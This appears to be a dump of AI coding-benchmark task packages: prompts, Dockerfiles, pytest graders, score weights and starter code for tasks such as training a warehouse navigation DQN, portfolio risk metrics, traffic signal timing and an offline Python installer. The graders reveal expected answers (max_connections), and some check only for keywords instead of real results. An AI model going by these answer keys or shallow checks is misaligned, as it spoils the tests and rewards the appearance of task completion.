$(MODULE_NAME)\n\n$(MODULE_NAME): pqueue.c\n\t$(CC) $(CFLAGS) -I$(REDIS_MODULE_PATH) -o $@ $< $(LDFLAGS)\n\nclean:\n\trm -f $(MODULE_NAME)\n\ntest: $(MODULE_NAME)\n\tredis-server --loadmodule ./$(MODULE_NAME) --port 6380 --daemonize yes --pidfile /tmp/redis-test.pid --dbfilename pqueue.rdb --dir /tmp\n\tsleep 1\n\tredis-cli -p 6380 ping\n\t\nstop:\n\t-redis-cli -p 6380 shutdown\n\n.PHONY: all clean test stop"", ""pqueue.c"": ""#include \""redismodule.h\""\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef struct PQueueItem {\n    char *value;\n    long long priority;\n    struct PQueueItem *next;\n} PQueueItem;\n\ntypedef struct {\n    PQueueItem *head;\n    size_t size;\n} PQueue;\n\nstatic RedisModuleType *PQueueType;\n\nPQueue *PQueueCreate(void) {\n    PQueue *pq = RedisModule_Alloc(sizeof(PQueue));\n    pq->head = NULL;\n    pq->size = 0;\n    return pq;\n}\n\nvoid PQueueFree(PQueue *pq) {\n    if (!pq) return;\n    \n    PQueueItem *current = pq->head;\n    while (current) {\n        PQueueItem *next = current->next;\n        RedisModule_Free(current->value);\n        RedisModule_Free(current);\n        current = next;\n    }\n    RedisModule_Free(pq);\n}\n\nint PQueuePush_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n    return RedisModule_ReplyWithError(ctx, \""Not implemented\"");\n}\n\nint PQueuePop_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n    return RedisModule_ReplyWithError(ctx, \""Not implemented\"");\n}\n\nint PQueuePeek_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n    return RedisModule_ReplyWithError(ctx, \""Not implemented\"");\n}\n\nvoid *PQueueRdbLoad(RedisModuleIO *rdb, int encver) {\n    return NULL;\n}\n\nvoid PQueueRdbSave(RedisModuleIO *rdb, void *value) {\n}\n\nvoid PQueueAofRewrite(RedisModuleIO *aof, RedisModuleString *key, void *value) {\n}\n\nvoid PQueueFreeCallback(void *value) {\n    PQueueFree(value);\n}\n\nint RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n    if (RedisModule_Init(ctx, \""pqueue\"", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {\n        return REDISMODULE_ERR;\n    }\n\n    RedisModuleTypeMethods tm = {\n        .version = REDISMODULE_TYPE_METHOD_VERSION,\n        .rdb_load = PQueueRdbLoad,\n        .rdb_save = PQueueRdbSave,\n        .aof_rewrite = PQueueAofRewrite,\n        .free = PQueueFreeCallback\n    };\n\n    PQueueType = RedisModule_CreateDataType(ctx, \""pqueue-dt\"", 0, &tm);\n    if (PQueueType == NULL) return REDISMODULE_ERR;\n\n    if (RedisModule_CreateCommand(ctx, \""pqueue.push\"", PQueuePush_RedisCommand, \""write\"", 1, 1, 1) == REDISMODULE_ERR)\n        return REDISMODULE_ERR;\n\n    if (RedisModule_CreateCommand(ctx, \""pqueue.pop\"", PQueuePop_RedisCommand, \""write\"", 1, 1, 1) == REDISMODULE_ERR)\n        return REDISMODULE_ERR;\n\n    if (RedisModule_CreateCommand(ctx, \""pqueue.peek\"", PQueuePeek_RedisCommand, \""readonly\"", 1, 1, 1) == REDISMODULE_ERR)\n        return REDISMODULE_ERR;\n\n    return REDISMODULE_OK;\n}""}",2025-07-21T14:02:37.259063,2025-07-22T11:37:22.102763+00:00
draft_dp_5c88a1ba,medium,draft_dp_5c88a1ba,machine-learning,The warehouse RL agent is failing navigation tests - only achieving 60% success rate. Need to fix the training and ensure it reaches 85% success while keeping the model under 150KB.,machine-learning,RL|pytorch|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install PyTorch and other ML dependencies
RUN pip install torch==2.7.0 --index-url https://download.pytorch.org/whl/cpu && \
    pip install numpy==2.2.1

# Copy the warehouse environment and agent files
COPY warehouse_env.py /workspace/
COPY rl_agent.py /workspace/
COPY train.py /workspace/

# Create models directory for saving
RUN mkdir -p /workspace/models

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_agent_navigation_success():
    """"""Test that the trained agent achieves at least 85% success rate.""""""
    # Run evaluation
    result = subprocess.run(
        ['python', '-c', '''
import sys
sys.path.append(""/workspace"")
from warehouse_env import WarehouseEnv
from rl_agent import WarehouseRLAgent

# Load the trained agent
agent = WarehouseRLAgent(state_size=8, action_size=4)
agent.load(""models/warehouse_agent.pth"")

# Evaluate on 100 episodes with different seeds
env = WarehouseEnv(size=10, n_obstacles=15, seed=456)
successes = 0

for i in range(100):
    env = WarehouseEnv(size=10, n_obstacles=15, seed=456 + i)
    state = env.reset()
    done = False
    
    while not done:
        action = agent.act(state, training=False)
        state, _, done, info = env.step(action)
    
    if info[""success""]:
        successes += 1

success_rate = successes / 100
print(success_rate)
'''],
        capture_output=True,
        text=True,
        cwd='/workspace'
    )
    
    assert result.returncode == 0, f""Evaluation failed: {result.stderr}""
    success_rate = float(result.stdout.strip())
    assert success_rate >= 0.85, f""Agent success rate {success_rate:.2%} is below required 85%""

def test_model_size_constraint():
    """"""Test that the saved model is under 150KB.""""""
    model_path = '/workspace/models/warehouse_agent.pth'
    assert os.path.exists(model_path), ""Model file not found""
    
    # Get file size in KB
    file_size_kb = os.path.getsize(model_path) / 1024
    assert file_size_kb < 150, f""Model size {file_size_kb:.1f}KB exceeds 150KB limit""","{""test_agent_navigation_success"": 0.8, ""test_model_size_constraint"": 0.2}","{""warehouse_env.py"": ""import numpy as np\nimport random\nfrom typing import Tuple, List, Dict, Any\n\nclass WarehouseEnv:\n    def __init__(self, size: int = 10, n_obstacles: int = 15, seed: int = None):\n        self.size = size\n        self.n_obstacles = n_obstacles\n        \n        if seed is not None:\n            random.seed(seed)\n            np.random.seed(seed)\n        \n        self.reset()\n    \n    def reset(self) -> np.ndarray:\n        # Initialize empty grid\n        self.grid = np.zeros((self.size, self.size))\n        \n        # Add obstacles (1 = obstacle)\n        obstacle_positions = random.sample(\n            [(i, j) for i in range(self.size) for j in range(self.size)],\n            self.n_obstacles\n        )\n        for pos in obstacle_positions:\n            self.grid[pos] = 1\n        \n        # Place agent at random free position\n        free_positions = [(i, j) for i in range(self.size) for j in range(self.size) \n                         if self.grid[i, j] == 0]\n        self.agent_pos = random.choice(free_positions)\n        \n        # Place goal at different random free position\n        free_positions.remove(self.agent_pos)\n        self.goal_pos = random.choice(free_positions)\n        \n        self.steps = 0\n        self.max_steps = self.size * self.size\n        \n        return self._get_observation()\n    \n    def _get_observation(self) -> np.ndarray:\n        # Simple observation: agent position, goal position, and nearby obstacles\n        obs = np.zeros(8)  # 2 for agent pos, 2 for goal pos, 4 for adjacent obstacles\n        \n        obs[0] = self.agent_pos[0] / self.size\n        obs[1] = self.agent_pos[1] / self.size\n        obs[2] = self.goal_pos[0] / self.size\n        obs[3] = self.goal_pos[1] / self.size\n        \n        # Check adjacent cells for obstacles\n        directions = [(0, 1), (1, 0), (0, -1), (-1, 0)]  # right, down, left, up\n        for i, (dr, dc) in enumerate(directions):\n            new_r, new_c = self.agent_pos[0] + dr, self.agent_pos[1] + dc\n            if 0 <= new_r < self.size and 0 <= new_c < self.size:\n                obs[4 + i] = self.grid[new_r, new_c]\n            else:\n                obs[4 + i] = 1  # Treat out-of-bounds as obstacle\n        \n        return obs\n    \n    def step(self, action: int) -> Tuple[np.ndarray, float, bool, Dict[str, Any]]:\n        # Actions: 0=right, 1=down, 2=left, 3=up\n        directions = [(0, 1), (1, 0), (0, -1), (-1, 0)]\n        \n        if action < 0 or action >= 4:\n            action = 0\n        \n        dr, dc = directions[action]\n        new_pos = (self.agent_pos[0] + dr, self.agent_pos[1] + dc)\n        \n        # Check if move is valid\n        if (0 <= new_pos[0] < self.size and \n            0 <= new_pos[1] < self.size and \n            self.grid[new_pos] == 0):\n            self.agent_pos = new_pos\n            reward = -0.01  # Small penalty for each step\n        else:\n            reward = -0.1  # Larger penalty for hitting wall/obstacle\n        \n        self.steps += 1\n        \n        # Check if goal reached\n        if self.agent_pos == self.goal_pos:\n            reward = 1.0\n            done = True\n        elif self.steps >= self.max_steps:\n            reward = -0.5  # Penalty for timeout\n            done = True\n        else:\n            done = False\n        \n        info = {\n            'success': self.agent_pos == self.goal_pos,\n            'steps': self.steps\n        }\n        \n        return self._get_observation(), reward, done, info\n    \n    @property\n    def observation_space_size(self) -> int:\n        return 8\n    \n    @property\n    def action_space_size(self) -> int:\n        return 4"", ""train.py"": ""import numpy as np\nfrom warehouse_env import WarehouseEnv\nfrom rl_agent import WarehouseRLAgent\nimport os\n\ndef train_agent(episodes: int = 500):\n    # Initialize environment and agent\n    env = WarehouseEnv(size=10, n_obstacles=15, seed=42)\n    agent = WarehouseRLAgent(\n        state_size=env.observation_space_size,\n        action_size=env.action_space_size,\n        lr=0.001\n    )\n    \n    success_history = []\n    \n    for episode in range(episodes):\n        state = env.reset()\n        total_reward = 0\n        done = False\n        \n        while not done:\n            action = agent.act(state)\n            next_state, reward, done, info = env.step(action)\n            agent.remember(state, action, reward, next_state, done)\n            state = next_state\n            total_reward += reward\n            \n            if len(agent.memory) > 32:\n                agent.replay(32)\n        \n        success_history.append(info['success'])\n        \n        # Update target network periodically\n        if episode % 10 == 0:\n            agent.update_target_network()\n        \n        # Print progress\n        if episode % 50 == 0:\n            recent_success_rate = np.mean(success_history[-50:]) if len(success_history) >= 50 else np.mean(success_history)\n            print(f\""Episode {episode}, Success Rate: {recent_success_rate:.2f}, Epsilon: {agent.epsilon:.3f}\"")\n    \n    # Save the trained model\n    agent.save('models/warehouse_agent.pth')\n    print(f\""Training complete. Final success rate: {np.mean(success_history[-100:]):.2f}\"")\n    \n    return agent\n\ndef evaluate_agent(agent: WarehouseRLAgent, n_episodes: int = 100) -> float:\n    env = WarehouseEnv(size=10, n_obstacles=15, seed=123)  # Different seed for evaluation\n    successes = 0\n    \n    for _ in range(n_episodes):\n        state = env.reset()\n        done = False\n        \n        while not done:\n            action = agent.act(state, training=False)\n            state, _, done, info = env.step(action)\n        \n        if info['success']:\n            successes += 1\n    \n    return successes / n_episodes\n\nif __name__ == \""__main__\"":\n    agent = train_agent(episodes=300)\n    \n    # Evaluate the agent\n    success_rate = evaluate_agent(agent)\n    print(f\""Evaluation success rate: {success_rate:.2%}\"")"", ""rl_agent.py"": ""import torch\nimport torch.nn as nn\nimport torch.optim as optim\nimport numpy as np\nimport random\nimport os\nfrom collections import deque\n\nclass DQN(nn.Module):\n    def __init__(self, input_size: int, output_size: int):\n        super(DQN, self).__init__()\n        # Simple network - needs optimization\n        self.fc1 = nn.Linear(input_size, 64)\n        self.fc2 = nn.Linear(64, 32)\n        self.fc3 = nn.Linear(32, output_size)\n        \n    def forward(self, x):\n        x = torch.relu(self.fc1(x))\n        x = torch.relu(self.fc2(x))\n        return self.fc3(x)\n\nclass WarehouseRLAgent:\n    def __init__(self, state_size: int, action_size: int, lr: float = 0.001):\n        self.state_size = state_size\n        self.action_size = action_size\n        self.memory = deque(maxlen=2000)\n        self.epsilon = 1.0\n        self.epsilon_min = 0.01\n        self.epsilon_decay = 0.995\n        self.gamma = 0.95\n        self.lr = lr\n        \n        # Neural networks\n        self.q_network = DQN(state_size, action_size)\n        self.target_network = DQN(state_size, action_size)\n        self.optimizer = optim.Adam(self.q_network.parameters(), lr=lr)\n        \n        self.update_target_network()\n    \n    def update_target_network(self):\n        self.target_network.load_state_dict(self.q_network.state_dict())\n    \n    def remember(self, state, action, reward, next_state, done):\n        self.memory.append((state, action, reward, next_state, done))\n    \n    def act(self, state: np.ndarray, training: bool = True) -> int:\n        if training and random.random() <= self.epsilon:\n            return random.randrange(self.action_size)\n        \n        state_tensor = torch.FloatTensor(state).unsqueeze(0)\n        q_values = self.q_network(state_tensor)\n        return np.argmax(q_values.detach().numpy())\n    \n    def replay(self, batch_size: int = 32):\n        if len(self.memory) < batch_size:\n            return\n        \n        batch = random.sample(self.memory, batch_size)\n        states = torch.FloatTensor([e[0] for e in batch])\n        actions = torch.LongTensor([e[1] for e in batch])\n        rewards = torch.FloatTensor([e[2] for e in batch])\n        next_states = torch.FloatTensor([e[3] for e in batch])\n        dones = torch.FloatTensor([e[4] for e in batch])\n        \n        current_q_values = self.q_network(states).gather(1, actions.unsqueeze(1))\n        next_q_values = self.target_network(next_states).max(1)[0].detach()\n        target_q_values = rewards + (self.gamma * next_q_values * (1 - dones))\n        \n        loss = nn.MSELoss()(current_q_values.squeeze(), target_q_values)\n        \n        self.optimizer.zero_grad()\n        loss.backward()\n        self.optimizer.step()\n        \n        if self.epsilon > self.epsilon_min:\n            self.epsilon *= self.epsilon_decay\n    \n    def save(self, path: str):\n        os.makedirs(os.path.dirname(path), exist_ok=True)\n        # Save only the essential model parameters\n        torch.save({\n            'model_state_dict': self.q_network.state_dict(),\n            'epsilon': self.epsilon\n        }, path)\n    \n    def load(self, path: str):\n        checkpoint = torch.load(path)\n        self.q_network.load_state_dict(checkpoint['model_state_dict'])\n        self.epsilon = checkpoint['epsilon']\n        self.update_target_network()""}",2025-07-21T14:02:36.075733,2025-07-22T11:38:24.401373+00:00
draft_dp_b745e08e,hard,draft_dp_b745e08e,data-science,"Need a CLI tool to analyze portfolio risk metrics from our stock data CSVs. Should calculate beta, volatility, and Sharpe ratio, then filter stocks by risk tolerance (e.g., find all stocks with beta < 1.2 and Sharpe > 0.5).",data-science,python|numpy|cli,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /portfolio_analyzer

# Install required packages
RUN pip install pandas numpy

# Create directory structure
RUN mkdir -p data

# Copy stock data files
COPY data/stock_prices.csv /portfolio_analyzer/data/
COPY data/market_index.csv /portfolio_analyzer/data/

# Set up the environment
CMD [""/bin/bash""]","import subprocess
import os
import json

def test_risk_analyzer_exists():
    """"""Test that the risk analyzer tool has been created.""""""
    # Check if the main script exists
    result = subprocess.run(['ls', 'risk_analyzer.py'], capture_output=True, text=True)
    assert result.returncode == 0, ""risk_analyzer.py script not found""

def test_risk_metrics_calculation():
    """"""Test that the tool correctly calculates and filters risk metrics.""""""
    # Run the analyzer with specific filters
    result = subprocess.run(
        ['python', 'risk_analyzer.py', '--beta-max', '1.2', '--sharpe-min', '0.5'],
        capture_output=True, text=True
    )
    
    assert result.returncode == 0, f""Tool failed to run: {result.stderr}""
    
    output = result.stdout
    
    # Check that output contains expected sections
    assert ""Stock:"" in output, ""Output should contain stock information""
    assert ""Beta:"" in output, ""Output should contain Beta values""
    assert ""Sharpe Ratio:"" in output, ""Output should contain Sharpe Ratio""
    assert ""Volatility:"" in output, ""Output should contain Volatility""
    
    # Verify that filtering is working (should have some results)
    assert ""No stocks match"" not in output, ""Should find stocks matching the criteria""","{""test_risk_analyzer_exists"": 0.3, ""test_risk_metrics_calculation"": 0.7}","{""data/stock_prices.csv"": ""Date,AAPL,MSFT,GOOGL,AMZN,TSLA,JPM,JNJ,PG,XOM,WMT,BAC,V,NVDA,DIS,NFLX,INTC,CSCO,PFE,CVX,T\n2024-01-02,185.64,374.35,139.65,151.94,248.42,170.31,156.47,145.89,100.22,157.65,33.84,273.73,492.44,90.29,481.73,50.12,52.65,28.95,150.01,16.77\n2024-01-03,184.25,370.87,140.11,149.93,238.45,171.81,156.49,147.64,101.45,158.96,34.10,274.65,481.18,91.33,465.24,49.25,52.42,29.26,152.19,16.59\n2024-01-04,182.19,367.94,138.35,149.26,237.93,169.73,155.88,146.42,99.05,157.41,33.42,271.13,467.67,89.89,441.28,48.86,51.57,28.81,148.52,16.48\n2024-01-05,184.40,372.52,140.59,150.17,234.40,169.86,157.17,146.82,99.99,158.22,33.75,273.84,475.11,90.53,440.42,49.35,52.10,29.10,149.98,16.66\n2024-01-08,185.56,375.15,141.42,151.31,235.63,172.30,157.95,148.13,102.16,159.74,34.23,276.95,482.87,91.74,449.15,49.87,52.78,29.35,152.44,16.85\n2024-01-09,185.14,373.63,139.71,150.45,237.18,170.48,157.29,147.22,101.58,158.66,33.97,274.21,478.32,90.89,453.82,49.45,52.35,29.18,151.11,16.72\n2024-01-10,186.19,377.44,142.28,152.37,240.92,171.66,158.49,148.76,103.31,160.55,34.51,277.52,490.97,92.17,467.94,50.12,53.14,29.64,154.23,16.95\n2024-01-11,185.59,374.67,141.25,151.42,238.73,170.95,157.84,147.93,102.45,159.33,34.18,275.43,485.21,91.44,462.33,49.78,52.68,29.41,152.88,16.81\n2024-01-12,185.92,376.04,141.58,151.74,241.05,171.32,158.12,148.25,102.93,159.88,34.32,276.17,487.65,91.69,470.76,49.95,52.85,29.48,153.45,16.88\n2024-01-15,187.85,379.23,143.65,153.35,243.85,173.62,159.53,149.93,104.83,162.21,34.94,279.85,495.83,93.16,485.29,50.75,53.65,29.95,156.72,17.15\n2024-01-16,183.63,371.54,140.05,149.94,237.49,169.75,156.25,146.71,101.67,158.14,33.85,272.95,476.18,90.65,461.73,49.35,52.18,29.12,151.35,16.69\n2024-01-17,182.68,368.95,139.15,148.65,235.20,168.42,155.43,145.84,100.33,156.95,33.51,270.62,470.42,89.74,454.85,48.92,51.72,28.87,149.18,16.54\n2024-01-18,188.63,383.45,145.84,155.49,246.33,175.34,160.74,151.34,106.42,163.85,35.42,282.74,502.18,94.35,493.82,51.25,54.18,30.25,158.95,17.35\n2024-01-19,191.56,388.92,148.13,157.84,250.38,178.42,162.89,153.67,108.94,166.74,36.18,287.13,512.74,96.23,508.94,52.15,55.18,30.78,162.84,17.68\n2024-01-22,193.89,393.29,150.24,159.94,254.72,181.15,164.78,155.89,111.23,169.33,36.82,291.24,522.93,97.94,524.18,52.95,56.08,31.25,166.45,17.95\n2024-01-23,195.62,396.94,151.87,161.73,257.94,183.24,166.35,157.64,113.15,171.54,37.34,294.62,530.84,99.35,538.62,53.65,56.85,31.68,169.74,18.22\n2024-01-24,193.50,392.14,149.75,159.21,253.18,180.35,163.94,155.23,110.67,168.72,36.72,289.94,521.35,97.64,527.93,52.75,55.95,31.15,166.12,17.88\n2024-01-25,196.37,398.52,152.43,162.15,259.73,184.27,167.48,158.95,114.28,172.65,37.65,296.73,537.28,100.24,546.85,54.05,57.35,31.95,170.95,18.42\n2024-01-26,195.17,395.42,151.13,160.64,256.48,182.19,165.83,157.14,112.35,170.42,37.15,293.18,530.52,98.94,536.42,53.35,56.62,31.55,168.24,18.15\n2024-01-29,196.75,399.18,152.84,162.35,260.18,184.94,168.13,159.45,114.93,173.24,37.82,297.85,539.84,100.75,549.73,54.35,57.68,32.15,171.83,18.52"", ""data/market_index.csv"": ""Date,SP500\n2024-01-02,4769.83\n2024-01-03,4704.81\n2024-01-04,4688.68\n2024-01-05,4697.24\n2024-01-08,4763.54\n2024-01-09,4756.50\n2024-01-10,4783.45\n2024-01-11,4780.94\n2024-01-12,4783.83\n2024-01-15,4794.83\n2024-01-16,4739.21\n2024-01-17,4719.55\n2024-01-18,4838.42\n2024-01-19,4890.97\n2024-01-22,4930.75\n2024-01-23,4964.48\n2024-01-24,4924.97\n2024-01-25,4994.67\n2024-01-26,4970.23\n2024-01-29,5011.12""}",2025-07-21T14:07:21.531994,2025-07-21T14:07:21.531994
draft_dp_1c589ab0,hard,draft_dp_1c589ab0,data-science,The traffic light timing at Main & 5th is causing backups during rush hour. Analyze the traffic data in /app/traffic_data/ and optimize the signal timing to reduce wait times by at least 20%.,data-science,python|optimization|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install numpy pandas scipy scikit-learn pillow matplotlib

# Create directory structure
RUN mkdir -p /app/traffic_data

# Copy traffic flow data and current timing configuration
COPY traffic_flow_morning.json /app/traffic_data/
COPY traffic_flow_noon.json /app/traffic_data/
COPY traffic_flow_evening.json /app/traffic_data/
COPY current_timing.json /app/

# Set up the environment
ENV PYTHONUNBUFFERED=1

CMD [""bash""]","import json
import os

def test_optimized_timing_reduces_wait_time():
    """"""Test that the optimized timing reduces wait time by at least 20%.""""""
    # Check that optimized timing file exists
    assert os.path.exists('/app/optimized_timing.json'), ""Optimized timing file not found""
    
    # Load current and optimized timings
    with open('/app/current_timing.json', 'r') as f:
        current = json.load(f)
    
    with open('/app/optimized_timing.json', 'r') as f:
        optimized = json.load(f)
    
    # Check report exists and contains improvement metrics
    assert os.path.exists('/app/optimization_report.txt'), ""Optimization report not found""
    
    with open('/app/optimization_report.txt', 'r') as f:
        report = f.read()
    
    # Verify report contains percentage improvement
    assert 'reduction' in report.lower() or 'improvement' in report.lower(), ""Report missing improvement metrics""
    
    # Basic validation that timing was actually changed
    current_greens = [p['green_time'] for p in current['phases']]
    optimized_greens = [p['green_time'] for p in optimized['phases']]
    assert current_greens != optimized_greens, ""Timing was not optimized""

def test_safety_constraints_met():
    """"""Test that all safety constraints are satisfied in the optimized timing.""""""
    with open('/app/optimized_timing.json', 'r') as f:
        timing = json.load(f)
    
    # Check minimum green time constraint
    for phase in timing['phases']:
        assert phase['green_time'] >= timing['minimum_green_time'], f""Phase {phase['name']} violates minimum green time""
    
    # Check yellow time is reasonable (3-4 seconds typical)
    for phase in timing['phases']:
        assert 3 <= phase['yellow_time'] <= 4, f""Phase {phase['name']} has unsafe yellow time""
    
    # Check pedestrian crossing time is adequate
    assert timing['pedestrian_crossing_time'] >= 20, ""Insufficient pedestrian crossing time""
    
    # Verify cycle length is reasonable (60-150 seconds typical)
    assert 60 <= timing['cycle_length'] <= 150, ""Cycle length outside reasonable range""","{""test_optimized_timing_reduces_wait_time"": 0.7, ""test_safety_constraints_met"": 0.3}","{""traffic_flow_evening.json"": ""{\n  \""timestamp\"": \""17:30:00\"",\n  \""vehicle_counts\"": {\n    \""north\"": {\""through\"": 110, \""left\"": 35, \""right\"": 25},\n    \""south\"": {\""through\"": 90, \""left\"": 28, \""right\"": 22},\n    \""east\"": {\""through\"": 130, \""left\"": 40, \""right\"": 30},\n    \""west\"": {\""through\"": 105, \""left\"": 32, \""right\"": 20}\n  },\n  \""average_arrival_rate\"": {\n    \""north\"": 2.5,\n    \""south\"": 2.1,\n    \""east\"": 3.0,\n    \""west\"": 2.4\n  }\n}"", ""traffic_flow_noon.json"": ""{\n  \""timestamp\"": \""12:30:00\"",\n  \""vehicle_counts\"": {\n    \""north\"": {\""through\"": 65, \""left\"": 25, \""right\"": 20},\n    \""south\"": {\""through\"": 70, \""left\"": 22, \""right\"": 18},\n    \""east\"": {\""through\"": 60, \""left\"": 20, \""right\"": 15},\n    \""west\"": {\""through\"": 55, \""left\"": 18, \""right\"": 14}\n  },\n  \""average_arrival_rate\"": {\n    \""north\"": 1.5,\n    \""south\"": 1.6,\n    \""east\"": 1.4,\n    \""west\"": 1.3\n  }\n}"", ""traffic_flow_morning.json"": ""{\n  \""timestamp\"": \""07:30:00\"",\n  \""vehicle_counts\"": {\n    \""north\"": {\""through\"": 85, \""left\"": 22, \""right\"": 15},\n    \""south\"": {\""through\"": 120, \""left\"": 18, \""right\"": 25},\n    \""east\"": {\""through\"": 95, \""left\"": 30, \""right\"": 20},\n    \""west\"": {\""through\"": 75, \""left\"": 15, \""right\"": 12}\n  },\n  \""average_arrival_rate\"": {\n    \""north\"": 1.8,\n    \""south\"": 2.7,\n    \""east\"": 2.4,\n    \""west\"": 1.7\n  }\n}"", ""current_timing.json"": ""{\n  \""cycle_length\"": 120,\n  \""phases\"": [\n    {\n      \""id\"": 1,\n      \""name\"": \""North-South\"",\n      \""green_time\"": 45,\n      \""yellow_time\"": 3,\n      \""all_red_time\"": 2,\n      \""directions\"": [\""north\"", \""south\""]\n    },\n    {\n      \""id\"": 2,\n      \""name\"": \""East-West\"",\n      \""green_time\"": 45,\n      \""yellow_time\"": 3,\n      \""all_red_time\"": 2,\n      \""directions\"": [\""east\"", \""west\""]\n    },\n    {\n      \""id\"": 3,\n      \""name\"": \""Protected Left Turns\"",\n      \""green_time\"": 20,\n      \""yellow_time\"": 3,\n      \""all_red_time\"": 2,\n      \""directions\"": [\""all_lefts\""]\n    }\n  ],\n  \""pedestrian_crossing_time\"": 25,\n  \""minimum_green_time\"": 15\n}""}",2025-07-21T14:10:07.086806,2025-07-21T14:10:07.086806
draft_dp_08d35951,medium,draft_dp_08d35951,software-engineering,Need to deploy Python with numpy/pandas/scikit-learn on air-gapped Ubuntu servers. Create an offline installer package that includes all dependencies.,software-engineering,python|package-management|software-installation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install additional tools needed
RUN apt-get update && apt-get install -y \
    wget \
    && rm -rf /var/lib/apt/lists/*

# Create initial project structure
RUN mkdir -p offline-python/wheels
RUN mkdir -p offline-python/scripts

# Copy initial work files
COPY prepare_offline.py /workspace/
COPY requirements.txt /workspace/offline-python/","import os
import tarfile
import json
import subprocess

def test_offline_package_created():
    """"""Test that the offline package archive was created with all components""""""
    package_path = ""/workspace/offline-python-package.tar.gz""
    assert os.path.exists(package_path), ""Offline package archive not found""
    
    # Verify it's a valid tar.gz file
    with tarfile.open(package_path, 'r:gz') as tar:
        members = tar.getnames()
        
        # Check for essential components
        assert any(""wheels/"" in m for m in members), ""No wheels directory in package""
        assert any(""install.sh"" in m for m in members), ""No install script in package""
        assert any("".whl"" in m for m in members), ""No wheel files in package""
        
        # Check that numpy, pandas, and scikit-learn wheels are present
        wheel_files = [m for m in members if m.endswith('.whl')]
        assert len(wheel_files) > 10, ""Too few wheel files - missing dependencies""
        
        # Verify core packages are included
        package_names = [os.path.basename(w).lower() for w in wheel_files]
        assert any(""numpy"" in p for p in package_names), ""numpy wheel not found""
        assert any(""pandas"" in p for p in package_names), ""pandas wheel not found"" 
        assert any(""scikit_learn"" in p or ""scikit-learn"" in p for p in package_names), ""scikit-learn wheel not found""

def test_offline_installation_works():
    """"""Test that the package can install without network access""""""
    # Check for the test installation marker
    test_install_marker = ""/workspace/offline_install_test_result.json""
    assert os.path.exists(test_install_marker), ""Installation test was not performed""
    
    with open(test_install_marker, 'r') as f:
        result = json.load(f)
    
    assert result.get(""install_success"") is True, ""Offline installation failed""
    assert ""numpy"" in result.get(""installed_packages"", []), ""numpy not installed""
    assert ""pandas"" in result.get(""installed_packages"", []), ""pandas not installed""
    assert ""scikit-learn"" in result.get(""installed_packages"", []), ""scikit-learn not installed""","{""test_offline_package_created"": 0.6, ""test_offline_installation_works"": 0.4}","{""requirements.txt"": ""numpy==1.26.4\npandas==2.2.0\nscikit-learn==1.4.0"", ""prepare_offline.py"": ""#!/usr/bin/env python3\n\""\""\""Initial attempt at offline package preparation - incomplete\""\""\""\n\nimport os\nimport subprocess\nimport sys\n\ndef download_packages():\n    \""\""\""Download packages and their dependencies\""\""\""\n    requirements_file = \""offline-python/requirements.txt\""\n    wheels_dir = \""offline-python/wheels\""\n    \n    # TODO: Download all dependencies as wheels\n    print(f\""Downloading packages to {wheels_dir}...\"")\n    \n    # Started implementation but needs completion\n    cmd = [\n        sys.executable, \""-m\"", \""pip\"", \""download\"",\n        \""-r\"", requirements_file,\n        \""-d\"", wheels_dir\n    ]\n    # Command prepared but not executed yet\n\ndef create_installer():\n    \""\""\""Create installation script\""\""\""\n    # TODO: Generate install.sh script\n    pass\n\nif __name__ == \""__main__\"":\n    print(\""Offline Python package preparation tool\"")\n    # Basic structure in place, needs implementation""}",2025-07-21T14:05:17.065605,2025-07-21T14:07:41.339553
draft_dp_76c8e253,medium,draft_dp_76c8e253,debugging,The app is hitting connection pool exhaustion after 30 mins under load. RPS drops to ~145. Run the load test and find which db_manager.py parameter change maximizes throughput (should reach 400+ RPS).,debugging,python|performance-optimization|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install PostgreSQL and build dependencies
RUN apt-get update && apt-get install -y \
    postgresql \
    postgresql-client \
    gcc \
    python3-dev \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy application files
COPY requirements.txt /app/
COPY app.py /app/
COPY db_manager.py /app/
COPY load_test.py /app/
COPY init_db.py /app/

# Install Python dependencies
RUN pip install -r requirements.txt

# Setup PostgreSQL
USER postgres
RUN /etc/init.d/postgresql start && \
    psql -c ""CREATE USER testuser WITH PASSWORD 'testpass';"" && \
    psql -c ""CREATE DATABASE testdb OWNER testuser;"" && \
    /etc/init.d/postgresql stop

USER root

# Create startup script
RUN echo '#!/bin/bash\n\
service postgresql start\n\
sleep 2\n\
python /app/init_db.py\n\
python /app/app.py &\n\
APP_PID=$!\n\
sleep 3\n\
echo ""Application started with PID $APP_PID""\n\
tail -f /dev/null' > /app/start.sh && \
chmod +x /app/start.sh

# Start services
CMD [""/app/start.sh""]","import os
import re

def test_solution_file_created():
    """"""Test that the agent created a solution file with the parameter change.""""""
    solution_files = ['solution.txt', 'solution.md', 'fix.txt', 'fix.md', 'answer.txt', 'answer.md']
    
    for fname in solution_files:
        if os.path.exists(f'/app/{fname}'):
            return True
    
    assert False, ""No solution file found (expected solution.txt, fix.txt, or answer.txt)""

def test_correct_parameter_identified():
    """"""Test that the solution identifies max_connections as the parameter to change.""""""
    solution_files = ['solution.txt', 'solution.md', 'fix.txt', 'fix.md', 'answer.txt', 'answer.md']
    
    content = None
    for fname in solution_files:
        fpath = f'/app/{fname}'
        if os.path.exists(fpath):
            with open(fpath, 'r') as f:
                content = f.read().lower()
            break
    
    assert content is not None, ""No solution file found""
    
    # Check if max_connections is mentioned
    assert 'max_connections' in content or 'max connections' in content, \
        ""Solution doesn't mention max_connections parameter""
    
    # Check if a reasonable value is suggested (should be >= 20)
    numbers = re.findall(r'\b\d+\b', content)
    valid_values = [int(n) for n in numbers if 20 <= int(n) <= 200]
    
